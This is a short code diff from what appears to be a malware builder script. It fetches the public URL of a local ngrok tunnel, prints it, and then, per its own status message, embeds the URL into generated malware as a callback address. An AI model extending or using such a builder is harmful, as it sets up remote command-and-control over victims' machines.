@@ -191,6 +191,7 @@ def make():#working
     system('curl localhost:4040/api/tunnels >a ')
     lnk = open('a').read().split('"')
     ngrok_link = lnk[17]
+    print('ngrok url : '+ngrok_link)
 
     print('Adding ngrok URL to malware...')
     
